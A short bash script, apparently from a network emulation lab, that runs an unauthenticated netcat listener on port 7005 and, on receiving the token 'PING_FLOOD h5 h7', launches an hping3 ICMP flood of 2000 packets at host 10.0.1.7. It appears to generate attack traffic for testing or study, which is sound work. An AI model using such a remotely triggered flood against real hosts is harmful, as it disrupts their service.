#!/bin/bash
PORT=7005
TARGET=10.0.1.7
IFACE=h5-eth0
TOKEN="PING_FLOOD h5 h7"

echo "[HOME3] Listener on port $PORT via $IFACE"

nc -lkp $PORT | while read -r line; do
  echo "[RX] $line"
  if [[ "$line" == *"$TOKEN"* ]]; then
    echo "[ATTACK] ICMP burst h5 → h7"
    hping3 -I $IFACE --icmp --count 2000 -i u1000 $TARGET >/dev/null 2>&1 &
  fi
done

